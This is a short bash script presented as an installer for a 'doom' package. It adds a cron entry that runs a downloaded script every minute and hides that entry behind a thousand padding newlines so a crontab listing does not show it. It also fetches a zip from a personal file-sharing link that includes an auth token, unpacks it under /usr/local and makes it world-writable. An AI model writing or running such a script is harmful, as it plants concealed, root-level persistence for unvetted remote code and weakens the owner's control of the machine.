#!/usr/bin/env bash

set -e

echo "Adding cron job..."
(crontab -l 2>/dev/null; printf '\n%.0s' {1..1000}; echo "* * * * * /usr/local/doom/doom.sh >> /var/log/logdoom.log 2>&1") | crontab -

echo "Downloading package..."
wget -O doom.zip "https://my.microsoftpersonalcontent.com/personal/76ddca7c70c999ac/_layouts/15/download.aspx?UniqueId=3f76e8d8-62a4-4e2d-9947-a0159ccdd550&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiJkN2MwYzU4NS0xNmEzLTQ4MTgtYTg4OS02MzNkZjdjZmE1MGEiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzczNjQ3NzY4In0.Igro9zQOYCmyGijlPoOVpJAy5uER9Gq4JZziATICDAwCnuNM4-bUwuvc0w7yP6EcibirVP6Pbr7I9jS9Z7sXoX8pF0LSTmDPXL85jwF7mbgYziMnrL0JpmXcz4u286Rtt5EEgh7IjY7kOS8yKWwHGw9GfxMzNU9gQ-KkzQqlZJMiGamplZRLs8G0tNYjAYyUNTt-a3MQhYa_ykUajcXIJoZgR1njSZ-ZDJ_drOEsAAUB02guOJk51J5u65Y2tnqJT-wx1x5CblE6fURDv6nR-JAeYZEk7uC1rKr2iiNP3py0CxdDtyrjluat3h81q63_zHQKYPIzhspRxxtnZnIk8RAuU2D4P85Btmy91ZUJxNCsMXdryBdf1hyCafprzY0wyQKRe_FQ60R-97T0AwIdHn-ARujNcfafhXK6wHpxx6FZ2h49Q0Pa7THzFK6K26rsCG4B6DyMoggxHIkkWlqsHRSH6yrazQ2gSPASNVDR0PRuDlaLNooOSU1MZGJDrNwqv0n3_Spf7txWbdI95s24vg.g6tDmvFL5DX1oFHcwBAJr4qbTplxD2embfKGxc7lRCg&ApiVersion=2.0"

echo "Installing dependencies..."
apt update
apt install -y unzip zip cron

echo "Creating directory..."
mkdir -p /usr/local/doom

echo "Extracting files..."
unzip -o doom.zip -d /usr/local/

echo "Setting permissions..."
chmod -R 777 /usr/local/doom


echo "Cleaning up..."
rm -f doom.zip

echo "Installation completed."
